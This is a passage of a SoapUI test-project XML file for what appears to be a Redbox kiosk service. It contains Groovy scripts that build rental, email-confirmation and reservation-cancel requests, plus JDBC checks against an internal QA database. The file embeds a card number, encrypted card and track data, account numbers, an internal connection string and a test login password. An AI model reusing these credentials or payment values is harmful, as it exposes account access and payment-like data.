]]></con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value/></con:property><con:property><con:name>InvoiceID</con:name><con:value/></con:property><con:property><con:name>CCNumber</con:name><con:value>4847354422892240</con:value></con:property><con:property><con:name>CCType</con:name><con:value>5</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value>90855364928109</con:value></con:property><con:property><con:name>DigitalpurchaseTaxAmt</con:name><con:value/></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.8800</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.9990</con:value></con:property><con:property><con:name>UseCredits</con:name><con:value>0</con:value></con:property><con:property><con:name>Email</con:name><con:value>rental.automation@gmail.com</con:value></con:property><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>PurchaseFormats</con:name><con:value>0</con:value></con:property><con:property><con:name>numOfPurchases</con:name><con:value>0</con:value></con:property><con:property><con:name>RentalFormats</con:name><con:value>1,2,12</con:value></con:property><con:property><con:name>numOfRentals</con:name><con:value>1,1,1</con:value></con:property><con:property><con:name>PromoCode</con:name><con:value>DVDONME</con:value></con:property><con:property><con:name>PromoValue</con:name><con:value>2</con:value></con:property><con:property><con:name>PurchaseCount</con:name><con:value>0</con:value></con:property><con:property><con:name>PurchaseBarcodes</con:name><con:value/></con:property><con:property><con:name>PurchaseProductFamily</con:name><con:value/></con:property><con:property><con:name>PurchaseProductType</con:name><con:value/></con:property><con:property><con:name>PurchaseDiscPrice</con:name><con:value/></con:property><con:property><con:name>purchasePayload</con:name><con:value/></con:property><con:property><con:name>RentalCount</con:name><con:value>3</con:value></con:property><con:property><con:name>RentalBarcodes</con:name><con:value>002190709,000150514,001505203</con:value></con:property><con:property><con:name>RentalProductFamily</con:name><con:value>Movies,Movies,Games</con:value></con:property><con:property><con:name>RentalProductType</con:name><con:value>DVD,Blu-ray,Xbox One</con:value></con:property><con:property><con:name>RentalDiscPrice</con:name><con:value>1.50,2.00,3.00</con:value></con:property><con:property><con:name>RentalNonReturnPrice</con:name><con:value>24.00,32.00,66.00</con:value></con:property><con:property><con:name>RentalNonReturnDays</con:name><con:value>16,16,22</con:value></con:property><con:property><con:name>rentalPayload</con:name><con:value>{"GroupType" : "Rental",  "Items" : [{"ProductId" : 872,"Barcode" : "002190709","VendStatus" : "Vended","ProductFamily" : "Movies","ProductType" : "DVD","MultiDisc" : false,"Pricing" : {"InitialNight" : 1.50,"ExtraNight" : 1.50,"NonReturn" : 24.00,"Expiration" : 1.50,"NonReturnDays" : 16,"PriceSetId" : 0,"Purchase" : 0,"ProductPriceId" : 0,"InitialDays" : null,"DefaultInitialNight" : null,"DefaultExtraNight" : null},"BlurayUpsell" : null,"ItemSourceType" : 3},{"ProductId" : 2312,"Barcode" : "000150514","VendStatus" : "Vended","ProductFamily" : "Movies","ProductType" : "Blu-ray","MultiDisc" : false,"Pricing" : {"InitialNight" : 2.00,"ExtraNight" : 2.00,"NonReturn" : 32.00,"Expiration" : 2.00,"NonReturnDays" : 16,"PriceSetId" : 1,"Purchase" : 0,"ProductPriceId" : 0,"InitialDays" : null,"DefaultInitialNight" : null,"DefaultExtraNight" : null},"BlurayUpsell" : null,"ItemSourceType" : 3},{"ProductId" : 10391,"Barcode" : "001505203","VendStatus" : "Vended","ProductFamily" : "Games","ProductType" : "Xbox One","MultiDisc" : false,"Pricing" : {"InitialNight" : 3.00,"ExtraNight" : 3.00,"NonReturn" : 66.00,"Expiration" : 3.00,"NonReturnDays" : 22,"PriceSetId" : 1,"Purchase" : 0,"ProductPriceId" : 0,"InitialDays" : null,"DefaultInitialNight" : null,"DefaultExtraNight" : null},"BlurayUpsell" : null,"ItemSourceType" : 3}],"Totals" : { "TaxRate" : 9.9990,"Subtotal" : 6.5 ,"DiscountedSubtotal" : 4.5,"TaxAmount" : 0.45,"GrandTotal" : 4.95} }</con:value></con:property><con:property><con:name>SetDaysBack</con:name><con:value>0</con:value></con:property><con:property><con:name>RentalTaxAmount</con:name><con:value>0.45</con:value></con:property><con:property><con:name>PurchaseTaxAmount</con:name><con:value>0</con:value></con:property><con:property><con:name>TransactionTotal</con:name><con:value>4.95</con:value></con:property><con:property><con:name>DiscountedSubTotal</con:name><con:value>4.5</con:value></con:property><con:property><con:name>SubTotal</con:name><con:value>6.5</con:value></con:property><con:property><con:name>IsOffline</con:name><con:value>false</con:value></con:property><con:property><con:name>HasPhysicalPurchase</con:name><con:value>false</con:value></con:property><con:property><con:name>RentalTitleIds</con:name><con:value>872,2312,10391</con:value></con:property><con:property><con:name>PurchaseTitleIds</con:name><con:value/></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageId%22%3A+%22773a7f1d-0add-4e14-a215-e52c500fa87f%22%2C%22KioskId%22%3A+1505%2C%22EngineVersion%22%3A+%221.15.0.6%22%2C%22BundleVersion%22%3A+%222.2.2.82%22%2C%22MessageType%22%3A+%22EstimateAccrual%22%2C%22CustomerProfileNumber%22%3A+%2290855364928109%22%2C%22TransactionDate%22%3A+%7B%22theDate%22%3A+636494020689580000%2C%22dateTimeKind%22%3A+%22Unspecified%22%2C%22dateString%22%3A+%222017-12-20T15%3A27%3A48.0000958%22%7D%2C%22CreditCard%22%3A+%7B%22FirstName%22%3A+%22Redbox%22%2C%22LastName%22%3A+%22Server%22%2C%22Number%22%3A+%22nzgl8cqgJfLdGXLm%2FW1sjdSrHqtO%2B6IeCoTRuZO%2Bu21l8%2F52qFitOlul2MYmMZbBi0qZ%2BnLJwoEgxN4oNwIVllqKY%2FitrhZGEYuzPJdRYEf1VWLxj1NoAgdQcYsQAdAmQMyPyJGufk9CpD%2B1%2BzxHdwevQCY0CT0iU9D47hkOoaqZg1nbhaQ2WEjwr6tWPlNZcjMYjEW%2BMVfgJjIcLJxes9Xk%2Ffc%2FKy95oXRDHqV2MHAHYSScZRfWq%2BFayZ9mMT9BUu6Xx95YFYEdPHCfci2ggq5wf5AKFqiyCBDFoRr%2B%2BOO4VoH%2Bm0bGPWG9sS0pRXwdjEaui5soGd6NbRTFxKIbbSzLZ9jfqyEU7CyYLugFN7wsuwdM3d1i2KSDoqAAZwXDvuBJEHzcMMNZZZ16bh8ij8r8w%2FXu7Ja6i%2FgM4iwWqPyv1QZJW9EDg%2BoJshiBIHH1PvNKN265V2n6cjmP663BSls%2FsDGvvWqF5EUuEqCBiTK%2BVpvc0Em%2BrDqav5hiGDvn1B9C4Wr69inrZahtlZXnh0jHMMKXZbGjVWv1woAhSlZZ7Pf5PnqAbOJ6EIZCiS2dT%2F4hhRd350POqVcgWsIy4TFqlZ7NKznSooaePjdUyldV3rnQiVMyS2XA%2FJqkiMGU2d%2B6%2FkFHieiwH%2FiPROJvKfma6%2Fm4glXwk3HG4QJvPmg%3D%22%2C%22PostalCode%22%3A+%2260181%22%2C%22ExpirationMonth%22%3A+%2212%22%2C%22ExpirationYear%22%3A+%2220%22%2C%22KeyId%22%3A+100002%2C%22CardId%22%3A+%2243coaeBl9JHRbF9f2I3ST1wtw3QMuIR0WzQbY83QXIM%3D%22%2C%22LastFour%22%3A+%222240%22%2C%22CardType%22%3A+5%2C%22Track2%22%3A+%22Xz4d5AMdpoJCPrQsh3EotMtF%2F%2B9mORwrzdAO8M2NXLJxk2n%2Bt5PKjFIcPs%2BJR%2FA0p2JRtQmIWgv3IY02V27EB7Z%2FeZzoXHwycTqlOExv6PugAKJBIa8uka9klF7gQoM%2BwCygIYvusQZvmF65EJ7XVw9x5rlvJ5f61umBFCJaO9ZRz5DQCPF%2BJX4zunFI9jXYYG3goAJ1T2KfJbqeVk4FphqPxayF7JZ0dVn0RPeJOTBWX31cuW4T1Fj9eMi4hLMODxJgk6s1q7ckgM37lJ6fe8BSlXYICT508z%2BYhR8ATtvGIznBNX4NiuII61IiZRcLlg3lbbO2E0Db9OH4CqxP0AbctY%2FYEySgpRCs0YnLiRaRhZEJc8EI8%2Ffjrmi6YujHENXxW6l%2Bk6sqthl6savgcSdCochDNVFcYh0dhccg4aHTs8%2F9cgkn%2BRkdpxqNadXTGOBcT%2FY7D2EnzV5KBV68Mj79oiKsIX8JJA2pP3Xzj4uSoS4XZfVOUZUoYKqyxvd7XwHV5RKkB%2FDNI5mLpn7FBVoAsIdlh369V0HiArjJr9gmQXPNGDcO7pxEn1EdsLRG%2FA1stEZ2zMikRAdl4CGSFZ3BHKsEw4DyC7R7YVsDD8ku5FKdNNRSOWBWGuYSiyGs0%2Bx%2B%2Bdm3nNOO%2F9V%2ByW%2FMLtqpnRK42N491ZAjqvmisGs%3D%22%7D%2C%22ShoppingCart%22%3A+%7B+%22Groups%22%3A+%5B++%7B%22GroupType%22+%3A+%22Rental%22%2C++%22Items%22+%3A+%5B%7B%22ProductId%22+%3A+872%2C%22Barcode%22+%3A+%22002190709%22%2C%22VendStatus%22+%3A+%22Vended%22%2C%22ProductFamily%22+%3A+%22Movies%22%2C%22ProductType%22+%3A+%22DVD%22%2C%22MultiDisc%22+%3A+false%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+1.50%2C%22ExtraNight%22+%3A+1.50%2C%22NonReturn%22+%3A+24.00%2C%22Expiration%22+%3A+1.50%2C%22NonReturnDays%22+%3A+16%2C%22PriceSetId%22+%3A+0%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+null%2C%22DefaultInitialNight%22+%3A+null%2C%22DefaultExtraNight%22+%3A+null%7D%2C%22BlurayUpsell%22+%3A+null%2C%22ItemSourceType%22+%3A+3%7D%2C%7B%22ProductId%22+%3A+2312%2C%22Barcode%22+%3A+%22000150514%22%2C%22VendStatus%22+%3A+%22Vended%22%2C%22ProductFamily%22+%3A+%22Movies%22%2C%22ProductType%22+%3A+%22Blu-ray%22%2C%22MultiDisc%22+%3A+false%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+2.00%2C%22ExtraNight%22+%3A+2.00%2C%22NonReturn%22+%3A+32.00%2C%22Expiration%22+%3A+2.00%2C%22NonReturnDays%22+%3A+16%2C%22PriceSetId%22+%3A+1%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+null%2C%22DefaultInitialNight%22+%3A+null%2C%22DefaultExtraNight%22+%3A+null%7D%2C%22BlurayUpsell%22+%3A+null%2C%22ItemSourceType%22+%3A+3%7D%2C%7B%22ProductId%22+%3A+10391%2C%22Barcode%22+%3A+%22001505203%22%2C%22VendStatus%22+%3A+%22Vended%22%2C%22ProductFamily%22+%3A+%22Games%22%2C%22ProductType%22+%3A+%22Xbox+One%22%2C%22MultiDisc%22+%3A+false%2C%22Pricing%22+%3A+%7B%22InitialNight%22+%3A+3.00%2C%22ExtraNight%22+%3A+3.00%2C%22NonReturn%22+%3A+66.00%2C%22Expiration%22+%3A+3.00%2C%22NonReturnDays%22+%3A+22%2C%22PriceSetId%22+%3A+1%2C%22Purchase%22+%3A+0%2C%22ProductPriceId%22+%3A+0%2C%22InitialDays%22+%3A+null%2C%22DefaultInitialNight%22+%3A+null%2C%22DefaultExtraNight%22+%3A+null%7D%2C%22BlurayUpsell%22+%3A+null%2C%22ItemSourceType%22+%3A+3%7D%5D%2C%22Totals%22+%3A+%7B+%22TaxRate%22+%3A+9.9990%2C%22Subtotal%22+%3A+6.5+%2C%22DiscountedSubtotal%22+%3A+4.5%2C%22TaxAmount%22+%3A+0.45%2C%22GrandTotal%22+%3A+4.95%7D+%7D%5D%2C%22Discounts%22%3A+%5B%7B%22ProductId%22%3A+872%2C%22DiscountType%22%3A+%22Loyalty%22%2C%22PromotionCode%22%3A+null%2C%22Amount%22%3A+1.50%7D%2C%7B%22ProductId%22%3A+2312%2C%22DiscountType%22%3A+%22Loyalty%22%2C%22PromotionCode%22%3A+null%2C%22Amount%22%3A+2.00%7D%2C%7B%22ProductId%22%3A+10391%2C%22DiscountType%22%3A+%22PromotionCode%22%2C%22PromotionCode%22%3A+%22DVDONME%22%2C%22Amount%22%3A+2%7D%5D%7D%7D+</con:value></con:property><con:property><con:name>LoyaltyFlag</con:name><con:value>1,1,0</con:value></con:property><con:property><con:name>LoyaltyProductPrice</con:name><con:value>1.50,2.00</con:value></con:property><con:property><con:name>LoyaltyProductId</con:name><con:value>872,2312</con:value></con:property><con:property><con:name>HasLoyaltyDiscount</con:name><con:value>1</con:value></con:property><con:property><con:name>HasPromoDiscount</con:name><con:value>1</con:value></con:property><con:property><con:name>NonLoyaltyProductId</con:name><con:value/></con:property><con:property><con:name>NonLoyaltyProductPrice</con:name><con:value/></con:property><con:property><con:name>testBucket</con:name><con:value/></con:property><con:property><con:name>DiscountTitleIds</con:name><con:value>10391</con:value></con:property><con:property><con:name>DiscountProductPrices</con:name><con:value>3.00</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>cf2a43da-fb68-4f28-b647-cabab658b5fb</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>c7ac4c10-ab96-4e99-b1ae-b373224e8115</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>86b29e8b-9449-4b42-a501-717ac5b2bccc</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>aee6dc73-e1a0-4123-aabd-fcd972f9608d</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="c67a213e-a9e3-41e3-b35f-f3653d8b2b11" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="EmailConfirm" searchProperties="true" timeout="0" maxResults="0"><con:settings/><con:testStep type="groovy" name="Encode Message Body (EmailConfirm)" id="7bbe7f2c-7461-467f-90af-988ca5d187bb"><con:settings/><con:config><script>import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('CustomerProfileSvc');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

requestPayload = "";
def KioskID = context.expand( '${#TestCase#KioskID}' );
def Email = context.expand( '${#TestCase#Email}' );
def MessageId = UUID.randomUUID().toString();

calendar = Calendar.getInstance();
def theDate = (621355968000000000 +calendar.getTimeInMillis()*10000).toString();
def dateString = (new Date().format("yyyy-MM-dd'T'HH:mm:ss.SSSSSSS"));

//Check for AccountNumber
def doesAccountExist = sql.firstRow("Select Count(*) as numOfRecords from Account Where NotificationEmailAddress = $Email");
def numOfRecords = Integer.valueOf(doesAccountExist.numOfRecords)
AccountNumber = "";
if (numOfRecords > 0 )
{
	def getAccountInfo = sql.firstRow("Select Top 1 AccountNumber from Account Where NotificationEmailAddress = $Email Order by 1 desc");
	AccountNumber = getAccountInfo.AccountNumber.toString();
	//log.info ("AccountNumber: $AccountNumber");
}

//Build Reconcile Request
requestPayload += "{";
requestPayload += "\"MessageType\": \"EmailConfirm\",";
requestPayload += "\"TransactionDate\": {";
requestPayload += "\"theDate\": $theDate,";
requestPayload += "\"dateTimeKind\": \"Unspecified\",";
requestPayload += "\"dateString\": \"$dateString\"";
requestPayload += "},";
requestPayload += "\"Email\": \"$Email\",";
if (AccountNumber == "")
{
	//no Account Number
}
else
{
	requestPayload += "\"AccountNumber\": \"$AccountNumber\",";
}
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"KioskId\": $KioskID,";
requestPayload += "\"EngineVersion\": \"1.15.0.6\",";
requestPayload += "\"BundleVersion\": \"2.2.2.82\",";
requestPayload += "\"UseMessageControl\": false";
requestPayload += "}";

// log to soapui log
log.info("EmailConfirmRequest: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result)
testRunner.testCase.setPropertyValue("EmailConfirmGUID",MessageId.toString()); //For MessageControl Validations</script></con:config></con:testStep><con:testStep type="httprequest" name="EmailConfirm (Request)" id="2ed6f26a-1eca-4a26-8211-fa5aecd02d45"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" id="2f827cec-96de-4b99-b2fc-4153a6dfe7c0" name="EmailConfirm (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" id="d00fe26d-b144-4dd6-8364-96f44b303ec1" name="Script Assertion"><con:configuration><scriptText>def response = URLDecoder.decode(messageExchange.getResponseContent())
log.info ("EmailConfirmResponse: $response")</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="groovy" name="EmailConfirm (Assertions)" id="830395ca-11ec-4977-8fcf-00f9655c97b7" disabled="true"><con:settings/><con:config><script>import groovy.json.JsonSlurper
def encodedBody = testRunner.testCase.getTestStepByName('EmailConfirm (Request)').getPropertyValue('Response');
def decodedBody = URLDecoder.decode(encodedBody);
def list = new JsonSlurper().parseText( decodedBody );
def actualPromptForPerks = list.get('PromptForPerks');
def actualPromptForEarlyId = list.get('PromptForEarlyId');
def actualTextClubEnabled = list.get('TextClubEnabled');
def actualSuccess = list.get('Success');

//Expected
def earlyIdOptInStatus = context.expand( '${DataSource#EarlyIdOptInStatus}' )
def textClubOptInStatus = context.expand( '${DataSource#TextClubOptInStatus}' )
def punchcardOptIN = context.expand( '${DataSource#PunchcardOptIN}' )

if (earlyIdOptInStatus == 'NotEnrolled')
{
	assert (actualPromptForEarlyId == true);
}
else
{
	assert (actualPromptForEarlyId == false);
}

if (punchcardOptIN == 'true')
{
	assert (actualPromptForPerks == false);
}
else
{
	assert (actualPromptForPerks == true);
}

if (textClubOptInStatus == 'Enrolled')
{
	assert (actualTextClubEnabled == true);
}
else
{
	assert (actualTextClubEnabled == false);
}</script></con:config></con:testStep><con:properties><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>Email</con:name><con:value>redboxqa@aol.com</con:value></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageType%22%3A+%22EmailConfirm%22%2C%22TransactionDate%22%3A+%7B%22theDate%22%3A+636709960013220000%2C%22dateTimeKind%22%3A+%22Unspecified%22%2C%22dateString%22%3A+%222018-08-27T14%3A46%3A41.0000322%22%7D%2C%22Email%22%3A+%22redboxqa%40aol.com%22%2C%22AccountNumber%22%3A+%2224311974094073%22%2C%22MessageId%22%3A+%22dc1b98ec-e460-4031-b3e9-5d643063ba73%22%2C%22KioskId%22%3A+1505%2C%22EngineVersion%22%3A+%221.15.0.6%22%2C%22BundleVersion%22%3A+%222.2.2.82%22%2C%22UseMessageControl%22%3A+false%7D</con:value></con:property><con:property><con:name>EmailConfirmGUID</con:name><con:value>dc1b98ec-e460-4031-b3e9-5d643063ba73</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value>59446925965076</con:value></con:property><con:property><con:name>CustomerProfileId</con:name><con:value>795843</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>12c98da2-fbe7-417e-ac6a-1d4e50507450</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>19b336cf-da7d-424e-a7ad-997fd09502b4</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>dd1fe812-2826-4ec1-b218-fb1df2df7257</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>c4a6a661-c0a6-4f93-a9ee-3eb085c863fa</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="cbe3bcf0-fceb-4bb8-8628-8152c17fc943" discardOkResults="true" failOnError="false" failTestCaseOnErrors="true" keepSession="false" name="CancelReservation" searchProperties="true" timeout="0"><con:settings/><con:testStep type="groovy" name="Encode Message Body (CancelReservation)" id="3f9ec13a-8260-4e04-9f9f-76a0c9d9f15b"><con:settings/><con:config><script>//NOTES: Starting from just for Rental, need to add logic for purchase.
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;

def KioskId= context.expand( '${#TestCase#KioskID}' )
requestPayload = "";

//Generate MessageGUID
def MessageId = UUID.randomUUID().toString();
def TransactionID = context.expand( '${#TestCase#TransactionID}');
def ReferenceNumber = context.expand( '${#TestCase#ReferenceNumber}');
//Build CancelReservation Request
requestPayload += "{";
requestPayload += "\"MessageType\": \"CancelReservation\",";
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"KioskId\": $KioskId,";
requestPayload += "\"EngineVersion\": \"1.3.5.0\",";
requestPayload += "\"BundleVersion\": \"2.22.0.0\",";
requestPayload += "\"ReferenceNumber\": $ReferenceNumber";
requestPayload += "}";

// log to soapui log
log.info("CancelReservation Request: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result);
testRunner.testCase.setPropertyValue("MessageId", MessageId);</script></con:config></con:testStep><con:testStep type="httprequest" name="CancelReservation (Request)" id="3d347985-b1fa-4556-b4ee-3537262642d6"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" name="CancelReservation (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" id="b2fa5210-dde2-4787-8c9d-57bcd781cdfc" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" name="Check for Success and HasErrors" id="70bc7102-0d46-4704-81fc-09b7237cee25"><con:configuration><scriptText>def response = URLDecoder.decode(messageExchange.getResponseContent())

log.info ("CancelReservation Response: $response")
assert response.contains("\"Success\":true,")
assert response.contains("\"HasErrors\":false,")

</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>Basic</con:selectedAuthProfile><con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes><con:authType>Global HTTP Settings</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>Basic</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>Basic</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="jdbc" name="Check Transaction" id="284905aa-6334-4545-8fe0-b8ea6496b893"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT 
	transaction_status,
	BillingTypeId,
	APPROVALCODE
FROM
	[Transaction](nolock)
WHERE 
	transaction_id = :TnxId
</con:query><con:assertion type="JDBC Status" id="1c53f172-8a7b-4171-a072-27619f91af57" name="JDBC Status"/><con:assertion type="XPath Match" id="30a7a6eb-1020-416b-9836-995fdb911d7f" name="Match content of [TRANSACTION_STATUS]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/TRANSACTION_STATUS[1]/text()</path><content>36</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="b5fb1922-42c9-4dbf-966d-4869349307c2" name="Script Assertion"><con:configuration><scriptText>//Get the actual values from JDBC response
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def actualBillingTypeID = holder.getNodeValue("//BILLINGTYPEID[1]")
assert actualBillingTypeID == null

def actualAppprovalCode = holder.getNodeValue("//APPROVALCODE[1]");
String approve = actualAppprovalCode.toString();	
assert approve.substring(0,8) == 'Approved';</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>TnxId</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Message Control" id="d07d10c7-8dbe-4f0d-a288-7a096143d3e4"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT
	ProcessFlag
FROM 
	MessageControl(nolock)
WHERE
	MessageId = :GUID</con:query><con:assertion type="Simple Contains" name="Contains" id="4e246be7-4cee-4b19-9b66-d23e79c330d8"><con:configuration><token>&lt;PROCESSFLAG>2&lt;/PROCESSFLAG></token><ignoreCase>false</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion><con:properties><con:property><con:name>GUID</con:name><con:value>${#TestCase#MessageId}</con:value></con:property></con:properties></con:config></con:testStep><con:properties><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>ReferenceNumber</con:name><con:value>5648659</con:value></con:property><con:property><con:name>CCPayload</con:name><con:value/></con:property><con:property><con:name>TransactionID</con:name><con:value>1983142</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value/></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageType%22%3A+%22CancelReservation%22%2C%22MessageId%22%3A+%22daa58f1c-59c2-4db1-bd8c-2729854b66a3%22%2C%22KioskId%22%3A+1505%2C%22EngineVersion%22%3A+%221.3.5.0%22%2C%22BundleVersion%22%3A+%222.22.0.0%22%2C%22ReferenceNumber%22%3A+5648659%7D</con:value></con:property><con:property><con:name>PickupGUID</con:name><con:value/></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value/></con:property><con:property><con:name>AccountNumber</con:name><con:value/></con:property><con:property><con:name>MessageId</con:name><con:value>daa58f1c-59c2-4db1-bd8c-2729854b66a3</con:value></con:property></con:properties><con:reportParameters/></con:testCase><con:properties><con:property><con:name>collectionmethod</con:name><con:value>6</con:value></con:property><con:property><con:name>DVDPrice</con:name><con:value>1.75</con:value></con:property><con:property><con:name>BlurayPrice</con:name><con:value>2.00</con:value></con:property><con:property><con:name>4KPrice</con:name><con:value>2.50</con:value></con:property><con:property><con:name>GamePrice</con:name><con:value>3.00</con:value></con:property><con:property><con:name>DVDNonReturnDays</con:name><con:value>16</con:value></con:property><con:property><con:name>BlurayNonReturnDays</con:name><con:value>16</con:value></con:property><con:property><con:name>4KNonReturnDays</con:name><con:value>16</con:value></con:property><con:property><con:name>GameNonReturnDays</con:name><con:value>22</con:value></con:property><con:property><con:name>PurchasePrice</con:name><con:value>8</con:value></con:property><con:property><con:name>DigitalCodePrice</con:name><con:value>15</con:value></con:property></con:properties><con:reportParameters/><con:environmentSpec><con:entry environmentId="4af3fc93-9685-42bf-a07f-496268228e70"><con:authProfile>Inherit From Parent</con:authProfile></con:entry></con:environmentSpec></con:testSuite><con:testSuite id="420f5555-970f-4046-8340-c93bcaa8e5fb" name="KioskServiceMethods"><con:settings/><con:runType>SEQUENTIAL</con:runType><con:testCase id="5095f806-2bfb-4d1d-b805-2c8f0e334b00" discardOkResults="true" failOnError="true" failTestCaseOnErrors="true" keepSession="false" name="KioskLogin(Email)" searchProperties="true" timeout="0" maxResults="0"><con:settings/><con:testStep type="datasource" name="DataSource" id="d2cbdf1b-7e5f-4b60-bfc6-9250e93c4e8d"><con:settings/><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="Grid"><con:configuration><check><![CDATA[<xml-fragment><con:entry xmlns:con="http://eviware.com/soapui/config">true</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">true</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">true</con:entry></xml-fragment>]]></check><row><![CDATA[<xml-fragment><con:entry xmlns:con="http://eviware.com/soapui/config">Perform a Successful login using LoginEmail and Password</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">rental.automation@gmail.com</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">Testing1!</con:entry><con:entry xmlns:con="http://eviware.com/soapui/config">1505</con:entry><con:entry 